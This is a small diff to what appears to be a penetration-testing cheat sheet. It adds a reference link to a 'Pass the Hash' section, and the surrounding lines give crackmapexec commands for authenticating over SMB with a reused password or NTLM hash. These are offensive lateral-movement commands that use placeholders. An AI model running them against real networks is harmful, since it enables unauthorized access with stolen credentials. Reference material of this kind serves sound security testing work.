@@ -67,7 +67,7 @@ Pass the Password
 --------------------------------------------------------
 > crackmapexec smb <ip/cidr> -u <user> -d <domain> -p <pass>
 
-Pass the Hash
+Pass the Hash [https://meriemlarouim.medium.com/pass-the-hash-gaining-access-without-cracking-passwords-ce67c267c491]
 --------------------------------------------------------
 > crackmapexec smb <ip/cidr> -u <user> -H <HASH> --local-auth
 
